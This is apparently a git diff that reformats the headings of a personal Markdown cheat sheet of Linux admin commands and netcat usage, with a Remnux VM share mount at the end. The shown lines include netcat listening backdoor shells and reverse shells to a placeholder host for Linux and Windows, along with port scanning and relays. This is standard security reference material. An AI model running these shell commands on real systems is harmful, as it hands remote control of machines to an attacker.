@@ -586,7 +586,6 @@ cat /etc/hosts
 sudo dd if=./ubuntu-18.04.4-desktop-amd64.iso of=/dev/sdc
 ```
 
-
 ls -AlF /var/lib/dpkg/info/
 ll /var/lib/dpkg/info/ | grep -i '.list'
 
@@ -606,8 +605,6 @@ sudo apt update && sudo apt upgrade -y && sudo snap refresh
 update-manager -d
 ```
 
-
-
 # NetCat Commands
 Fundamental Netcat Client:
 ```
@@ -620,7 +617,7 @@ $ nc –l -p [LocalPort]
 Both the client and listener take input from STDIN
 and send data received from the network to STDOUT
 
-# File transfer using NetCat
+* File transfer using NetCat
 
 Push a file from client to listener:
 ```
@@ -641,8 +638,8 @@ $ nc –w3 [TargetIPaddr] [port] > [outfile]
 ```
 Connect to [TargetIPaddr] on [port] and retrieve [outfile]
 
-# NetCat TCP Port Scanner
-==================
+* NetCat TCP Port Scanner
+
 Port scan an IP Address:
 ```
 $ nc –v –n –z –w1 [TargetIPaddr]
@@ -657,8 +654,7 @@ second for a connection to occur (-w1)
 The randomize ports (-r) switch can be used to
 choose port numbers randomly in the range
 
-#TCP Banner Grabber
-==================-
+* TCP Banner Grabber
 Grab the banner of any TCP service running on an IP
 Address from Linux:
 ```
@@ -676,23 +672,23 @@ Add –r to randomize destination ports within the
 range
 Add –p [port] to specify a source port for the
 
-# NetCat Backdoor Shells
-===============-
-* Listening backdoor shell on Linux:
+* NetCat Backdoor Shells
+
+Listening backdoor shell on Linux:
 ```
 $ nc –l –p [LocalPort] –e /bin/bash
 ```
-* Listening backdoor shell on Windows:
+Listening backdoor shell on Windows:
 ```   
 C:\> nc –l –p [LocalPort] –e cmd.exe
 ```
 
 Create a shell on local port [LocalPort] that can then be accessed using a fundamental Netcat client
-* NetCt Reverse backdoor shell on Linux:
+NetCt Reverse backdoor shell on Linux:
 ```
 $ nc [YourIPaddr] [port] –e /bin/bash
 ```
-* Reverse backdoor shell on Windows:
+Reverse backdoor shell on Windows:
 ```
 C:\> nc [YourIPaddr] [port] –e cmd.exe
 ```
@@ -700,7 +696,7 @@ Create a reverse shell that will attempt to connect to
 [YourIPaddr] on local port [port]. This shell
 can then be captured using a fundamental nc listener
 
-* Netcat Relays on Linux
+Netcat Relays on Linux
 To start, create a FIFO (named pipe) called backpipe:
 ```
    $ cd /tmp
@@ -732,7 +728,7 @@ Create a relay that sends packets from the connection to [PreviousHopIPaddr] on 
 # BRO 
 
 # Remnux - VMWare make share folder available (run on guest)
-### https://askubuntu.com/questions/29284/how-do-i-mount-shared-folders-in-ubuntu-using-vmware-tools
+* https://askubuntu.com/questions/29284/how-do-i-mount-shared-folders-in-ubuntu-using-vmware-tools
 ```
    sudo vmhgfs-fuse .host:/ /mnt/hgfs/ -o allow_other -o uid=1000
 ```
